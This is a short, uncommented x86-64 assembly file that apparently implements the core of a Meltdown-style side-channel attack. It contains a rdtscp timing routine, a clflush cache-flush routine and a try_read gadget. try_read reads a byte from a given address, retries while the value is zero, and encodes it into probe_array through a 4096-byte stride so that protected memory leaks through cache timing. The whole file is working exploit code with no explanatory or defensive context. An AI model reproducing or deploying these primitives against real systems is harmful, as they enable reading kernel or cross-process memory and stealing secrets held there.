extern probe_array

global time_load
global flush_cache
global try_read

time_load:
    rdtscp
    mov r9, rax
    inc byte [rdi]
    rdtscp
    dec byte [rdi]
    sub rax, r9
    ret

flush_cache:
    clflush [rdi]
    ret

try_read:
    xor rax, rax
    mov al, byte [rdi]

    shl rax, 0xc
    jz try_read
    mov rbx, qword [probe_array + rax]
    ret
